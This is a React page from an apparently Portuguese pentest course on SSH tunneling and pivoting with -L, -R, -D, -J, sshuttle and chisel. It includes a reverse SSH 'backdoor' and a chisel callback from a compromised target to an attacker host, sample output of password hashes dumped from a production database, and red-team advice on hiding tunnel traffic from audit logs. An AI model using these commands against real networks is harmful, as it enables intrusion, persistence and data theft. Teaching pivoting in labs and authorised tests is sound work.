import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function SSHTunneling() {
  return (
    <PageContainer
      title="SSH Tunneling — pivot, port forward, SOCKS"
      subtitle="-L (local), -R (remote), -D (dynamic SOCKS), -J (jump), sshuttle, chisel."
      difficulty="intermediario"
      timeToRead="14 min"
    >
      <h2>3 tipos de tunel</h2>
      <OutputBlock label="resumo visual" type="muted">
{`-L (Local Forward)
  meu_kali:8080 → ssh → server:80
  "exponho UMA porta REMOTA na minha máquina"

-R (Remote Forward)
  server:9090 ← ssh ← meu_kali:80
  "exponho UMA porta MINHA num server remoto"

-D (Dynamic SOCKS)
  meu_kali:1080 → ssh → server → qualquer porta da rede do server
  "uso o server como proxy SOCKS para a rede dele"`}
      </OutputBlock>

      <h2>-L Local forward (acessar serviço interno via pivot)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "cenário: você acessa SSH em jumphost. DB roda em interno-db:5432 que SÓ jumphost vê",
            cmd: "ssh -L 5432:interno-db.lab:5432 wallyson@jumphost.empresa.com",
            out: `Linux jumphost 5.15.0-91 #101 SMP x86_64 GNU/Linux
Last login: Wed Apr  3 19:42:11 2026 from 187.84.42.108
wallyson@jumphost:~$ `,
            outType: "info",
          },
          {
            comment: "no SEU kali (outro terminal), conecta como se DB fosse local",
            cmd: "psql -h 127.0.0.1 -p 5432 -U dbuser -d producao",
            out: `Password for user dbuser: 
psql (15.5 (Debian 15.5-0+deb12u1))
Type "help" for help.

producao=> \\dt
                    List of relations
 Schema |        Name         | Type  |  Owner   
--------+---------------------+-------+----------
 public | users               | table | dbuser
 public | payments            | table | dbuser
 public | api_tokens          | table | dbuser
(3 rows)

producao=> SELECT email, password_hash FROM users LIMIT 3;
        email         |             password_hash             
----------------------+---------------------------------------
 ana@empresa.com.br   | $2y$12$...
 joao@empresa.com.br  | $2y$12$...`,
            outType: "warning",
          },
          {
            comment: "variação: bind-address — se quiser que outros da SUA LAN acessem",
            cmd: "ssh -L 0.0.0.0:5432:interno-db.lab:5432 wallyson@jumphost",
            out: "(qualquer um na sua LAN pode psql -h SEU_IP_KALI)",
            outType: "muted",
          },
          {
            comment: "múltiplas portas em 1 só comando",
            cmd: "ssh -L 5432:db:5432 -L 6379:redis:6379 -L 9200:elastic:9200 wallyson@jump",
            out: "(3 services internos expostos local)",
            outType: "default",
          },
        ]}
      />

      <h2>-R Remote forward (reverse shell mesmo atrás de NAT)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "cenário: você comprometeu uma máquina mas ela está atrás de NAT/firewall — não aceita conexão entrada",
            cmd: "(no alvo) ssh -R 9999:127.0.0.1:22 atacante@kali-publico.com",
            out: `(autentica e fica em foreground)`,
            outType: "muted",
          },
          {
            comment: "agora no SEU kali: SSH no port 9999 LOCAL = vai pro alvo!",
            cmd: "ssh -p 9999 wallyson@127.0.0.1",
            out: `Linux target-atras-de-nat 5.4.0-91 x86_64
wallyson@target-atras-de-nat:~$ id
uid=1000(wallyson) gid=1000(wallyson)`,
            outType: "warning",
          },
          {
            comment: "expor porta web também",
            cmd: "(no alvo) ssh -R 8000:localhost:8000 atacante@kali-publico",
            out: "(agora kali_publico:8000 = python -m http.server do alvo)",
            outType: "default",
          },
          {
            comment: "fazer aceitar de qualquer interface no atacante (não só localhost)",
            cmd: "(no atacante /etc/ssh/sshd_config: GatewayPorts yes) → systemctl restart ssh",
            out: "(agora -R bind 0.0.0.0:9999 = acessível da internet!)",
            outType: "info",
          },
        ]}
      />

      <h2>-D Dynamic (SOCKS proxy)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "abre SOCKS5 local na 1080 — todas as suas tools podem usar pra acessar a rede do jump",
            cmd: "ssh -D 1080 -N -f wallyson@jumphost.empresa.com",
            out: "(silencioso, vai pra background. -N=sem comando, -f=fork)",
            outType: "muted",
          },
          {
            comment: "agora qualquer ferramenta com proxychains",
            cmd: "head -1 /etc/proxychains.conf && grep -A1 ProxyList /etc/proxychains4.conf | tail -2",
            out: `# proxychains.conf  VER 4.x
[ProxyList]
socks5 127.0.0.1 1080`,
            outType: "info",
          },
          {
            cmd: "proxychains -q nmap -sT -Pn --top-ports=20 192.168.50.10",
            out: `Starting Nmap 7.95
Nmap scan report for 192.168.50.10
Host is up.
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3306/tcp open     mysql
5432/tcp open     postgresql
8080/tcp open     http-proxy
8443/tcp filtered https-alt`,
            outType: "warning",
          },
          {
            cmd: "proxychains -q firefox http://192.168.50.10",
            out: "(browser navega NO interno via tunel)",
            outType: "default",
          },
          {
            comment: "alternativa moderna: torsocks/proxychains4-ng",
            cmd: "proxychains4 -q curl -s http://intranet.empresa/admin",
            out: `<html><title>Painel admin (interno)</title>...`,
            outType: "info",
          },
        ]}
      />

      <h2>-J ProxyJump (cadeia de saltos)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "antes (verboso): conecta via 2 hops",
            cmd: "ssh -o ProxyCommand='ssh -W %h:%p user@jump' user@interno",
            out: "(funciona mas feio)",
            outType: "muted",
          },
          {
            comment: "moderno: -J jumphost",
            cmd: "ssh -J wallyson@jumphost.empresa.com deploy@interno-srv.lab",
            out: `wallyson@jumphost.empresa.com's password: 
deploy@interno-srv.lab's password: 

Linux interno-srv 5.4 #1 SMP
Last login: Wed Apr  3 14:21:42 2026 from jumphost
deploy@interno-srv:~$`,
            outType: "info",
          },
          {
            comment: "cadeia múltipla: dmz → core → restrito",
            cmd: "ssh -J user@dmz.empresa.com,user@core.empresa.local user@restrito.lab",
            out: "(faz 3 SSHs em sequência)",
            outType: "default",
          },
          {
            comment: "salvar no ~/.ssh/config para nunca digitar de novo",
            cmd: "cat ~/.ssh/config",
            out: `Host jumphost
  HostName jumphost.empresa.com
  User wallyson
  Port 22

Host interno
  HostName interno-srv.lab
  User deploy
  ProxyJump jumphost
  
# agora basta:
ssh interno`,
            outType: "info",
          },
        ]}
      />

      <h2>sshuttle — VPN over SSH (transparent)</h2>
      <p>
        Mais simples que SOCKS — funciona como VPN, sem precisar configurar proxy em cada tool.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y sshuttle",
            out: "(já vem no kali-tools-top10)",
            outType: "muted",
          },
          {
            cmd: "sshuttle -r wallyson@jumphost.empresa.com 192.168.50.0/24 --dns",
            out: `client: Connected.
client: Routes added: 192.168.50.0/24 via 192.168.1.1
fw: shadowing target /etc/resolv.conf
client: DNS via 192.168.50.10 added`,
            outType: "success",
          },
          {
            comment: "agora qualquer ferramenta funciona NORMAL — sem proxychains",
            cmd: "nmap -sV 192.168.50.10",
            out: `Nmap scan report for 192.168.50.10
22/tcp   open  ssh     OpenSSH 8.4p1
445/tcp  open  smb     Microsoft Windows Server SMB`,
            outType: "info",
          },
          {
            comment: "encerra com Ctrl+C — rede volta normal automático",
            cmd: "(Ctrl+C)",
            out: "client: fatal: server died",
            outType: "muted",
          },
        ]}
      />

      <h2>chisel — tunel HTTP/WebSocket (atravessa proxy)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget -qO- https://github.com/jpillora/chisel/releases/latest/download/chisel_$(uname -s)_$(uname -m).gz | gunzip > chisel && chmod +x chisel",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "no atacante (kali-publico): server",
            cmd: "./chisel server -p 443 --reverse",
            out: `2026/04/03 22:14:21 server: Reverse tunnelling enabled
2026/04/03 22:14:21 server: Listening on http://0.0.0.0:443`,
            outType: "info",
          },
          {
            comment: "no alvo (atrás de firewall, só permite saída HTTP/443): client",
            cmd: "./chisel client kali-publico:443 R:1080:socks",
            out: `2026/04/03 22:14:48 client: Connecting to ws://kali-publico:443
2026/04/03 22:14:49 client: Connected (Latency 18.412ms)`,
            outType: "warning",
          },
          {
            comment: "agora kali-publico tem SOCKS5 na 1080 → rede interna do alvo",
            cmd: "(no atacante) proxychains -q nmap -sT -Pn --top-ports=20 192.168.10.0/24",
            out: `Nmap scan report for 192.168.10.5
22/tcp open ssh
80/tcp open http`,
            outType: "default",
          },
        ]}
      />

      <h2>Cheatsheet final</h2>
      <CommandTable
        title="Comandos prontos para copiar"
        variations={[
          { cmd: "ssh -L 8080:db:80 user@jump", desc: "DB:80 vira local 8080.", output: "Acessa localhost:8080." },
          { cmd: "ssh -L 0.0.0.0:8080:db:80 user@jump", desc: "Mesmo, mas todos da SUA LAN podem usar.", output: "GatewayPorts." },
          { cmd: "ssh -R 9999:127.0.0.1:22 user@kali", desc: "Backdoor SSH atrás de NAT.", output: "Atacante: ssh -p 9999 user@127.0.0.1." },
          { cmd: "ssh -D 1080 -N -f user@jump", desc: "SOCKS5 dinâmico em background.", output: "proxychains nmap..." },
          { cmd: "ssh -J u1@hop1,u2@hop2 u3@final", desc: "Multi-hop com 1 comando.", output: "Save em ~/.ssh/config." },
          { cmd: "sshuttle -r user@jump 10.0.0.0/8 --dns", desc: "VPN-like via SSH.", output: "Sem proxychains." },
          { cmd: "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null", desc: "Pular fingerprint check (lab).", output: "NUNCA em prod." },
          { cmd: "ssh -i id_rsa -o IdentitiesOnly=yes user@host", desc: "Forçar essa key específica.", output: "Quando tem agent com várias." },
          { cmd: "scp -J jump file.zip user@interno:/tmp/", desc: "scp via jumphost.", output: "Funciona como ssh -J." },
        ]}
      />

      <h2>SSH config para PivotOps</h2>
      <CodeBlock
        language="ssh-config"
        title="~/.ssh/config — ambiente típico de pentest"
        code={`# === labs ===
Host htb
  HostName 10.10.14.1
  User root
  Port 22
  IdentityFile ~/.ssh/htb_id_ed25519
  ServerAliveInterval 60
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null

# === cliente cliente_x ===
Host cx-jump
  HostName jumphost.cliente.com.br
  User wallyson
  Port 22
  IdentityFile ~/.ssh/clientex_jump
  
Host cx-internal-*
  ProxyJump cx-jump
  User deploy
  StrictHostKeyChecking no

Host cx-internal-db1
  HostName 192.168.50.10

Host cx-internal-app1
  HostName 192.168.50.20

# === defaults ===
Host *
  ServerAliveInterval 30
  ServerAliveCountMax 3
  TCPKeepAlive yes
  Compression yes`}
      />

      <PracticeBox
        title="Lab: pivot pra DB interno"
        goal="Configurar -L para acessar DB que só seu jumphost vê."
        steps={[
          "Suba 2 containers: jump (com SSH) + db (postgres) em mesma docker-network.",
          "Confirme que do seu host você NÃO acessa db direto.",
          "ssh -L 5432:db:5432 user@jump.",
          "psql -h 127.0.0.1 do seu host → conecta no db pelo tunel.",
        ]}
        command={`# subir lab
docker network create labnet
docker run -d --name db --network labnet -e POSTGRES_PASSWORD=lab postgres:15
docker run -d --name jump --network labnet -p 2222:22 \\
  -e USER_NAME=wallyson -e USER_PASSWORD=lab \\
  ghcr.io/linuxserver/openssh-server

# tunel (sua máquina)
ssh -L 5432:db:5432 -p 2222 wallyson@127.0.0.1
# (em outro terminal)
psql -h 127.0.0.1 -p 5432 -U postgres
# senha: lab`}
        expected={`psql (15.5)
Type "help" for help.
postgres=> \\l
                          List of databases
   Name    |  Owner   | Encoding | Collate
-----------+----------+----------+----------
 postgres  | postgres | UTF8     | en_US.utf8
 template0 | postgres | UTF8     | en_US.utf8`}
        verify="Sem o tunel ativo, psql -h db falha. Com o tunel, psql -h 127.0.0.1 funciona — porque na verdade é o jump que se conecta."
      />

      <AlertBox type="warning" title="Logs deixam rastro">
        Cada SSH com -L/-R/-D fica em <code>/var/log/auth.log</code> do jumphost com IP+porta+timestamp.
        Em pentest declare e documente todos os tuneis. Em red team use chisel/SOCKS HTTP que misturam
        no tráfego web (audit log mais difícil).
      </AlertBox>
    </PageContainer>
  );
}
